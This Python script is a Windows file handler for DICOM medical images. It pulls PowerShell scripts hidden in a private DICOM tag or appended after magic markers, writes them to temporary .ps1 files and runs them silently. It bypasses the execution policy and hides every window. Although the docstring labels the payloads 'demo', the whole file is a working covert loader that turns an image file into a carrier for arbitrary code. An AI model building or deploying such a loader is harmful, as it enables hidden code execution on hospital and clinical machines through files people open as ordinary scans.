#!/usr/bin/env python3
"""Windows .dcm double-click handler — runs embedded demo payloads silently."""
from __future__ import annotations

import io
import subprocess
import sys
import tempfile
from pathlib import Path

import pydicom

FILE_LAUNCHER_MAGIC = b"<<<DCM_FILE_LAUNCHER>>>"
SCRIPT_MAGIC = b"<<<DCM_EMBEDDED_SCRIPT>>>"
PRIVATE_CREATOR = "DEMO_EMBED"
PRIVATE_GROUP = 0x51


def _parse_script_payload(data: bytes, offset: int = 0) -> bytes | None:
    if not data[offset:].startswith(SCRIPT_MAGIC):
        return None
    start = offset + len(SCRIPT_MAGIC)
    if len(data) < start + 4:
        return None
    length = int.from_bytes(data[start : start + 4], "little")
    return data[start + 4 : start + 4 + length]


def _extract_script(data: bytes) -> bytes | None:
    idx = data.rfind(SCRIPT_MAGIC)
    if idx < 0:
        return None
    return _parse_script_payload(data, idx)


def _extract_launcher(data: bytes) -> str | None:
    idx = data.rfind(FILE_LAUNCHER_MAGIC)
    if idx < 0:
        return None
    return data[idx + len(FILE_LAUNCHER_MAGIC) :].decode("utf-8", errors="replace")


def _extract_from_private_tag(data: bytes) -> tuple[bytes | None, str | None]:
    try:
        ds = pydicom.dcmread(io.BytesIO(data), force=True)
        block = ds.private_block(PRIVATE_GROUP, PRIVATE_CREATOR)
    except (KeyError, Exception):
        return None, None

    script = None
    launcher = None
    if 0x01 in block:
        script = _parse_script_payload(bytes(block[0x01].value))
    if 0x02 in block:
        launcher = bytes(block[0x02].value).decode("utf-8", errors="replace")
    return script, launcher


def _launch_ps1(path: str, extra_args: list[str] | None = None) -> None:
    """Run PowerShell hidden — only child processes (e.g. Notepad) stay visible."""
    cmd = [
        "powershell.exe",
        "-NoProfile",
        "-NoLogo",
        "-WindowStyle",
        "Hidden",
        "-ExecutionPolicy",
        "Bypass",
        "-File",
        path,
    ]
    if extra_args:
        cmd.extend(extra_args)
    flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
    subprocess.Popen(cmd, creationflags=flags, close_fds=True)


def _write_temp_ps1(content: str) -> str:
    tmp = tempfile.NamedTemporaryFile(
        mode="w",
        suffix=".ps1",
        delete=False,
        encoding="utf-8",
        prefix="dcm_embed_",
    )
    tmp.write(content)
    tmp.close()
    return tmp.name


def _run_payload(dicom_path: Path, raw: bytes) -> bool:
    private_script, private_launcher = _extract_from_private_tag(raw)

    if private_script:
        script_path = _write_temp_ps1(private_script.decode("utf-8", errors="replace"))
        _launch_ps1(script_path)
        return True

    if private_launcher:
        launcher_path = _write_temp_ps1(private_launcher)
        _launch_ps1(launcher_path, [str(dicom_path)])
        return True

    launcher = _extract_launcher(raw)
    if launcher:
        launcher_path = _write_temp_ps1(launcher)
        _launch_ps1(launcher_path, [str(dicom_path)])
        return True

    script = _extract_script(raw)
    if script:
        script_path = _write_temp_ps1(script.decode("utf-8", errors="replace"))
        _launch_ps1(script_path)
        return True

    return False


def main(argv: list[str]) -> int:
    if len(argv) < 2:
        print("Usage: open_embedded_dicom.py <file.dcm>", file=sys.stderr)
        return 1

    dicom_path = Path(argv[1])
    if not dicom_path.is_file():
        print(f"File not found: {dicom_path}", file=sys.stderr)
        return 1

    raw = dicom_path.read_bytes()
    if not _run_payload(dicom_path, raw):
        print("No embedded launcher or script found in this DICOM.", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
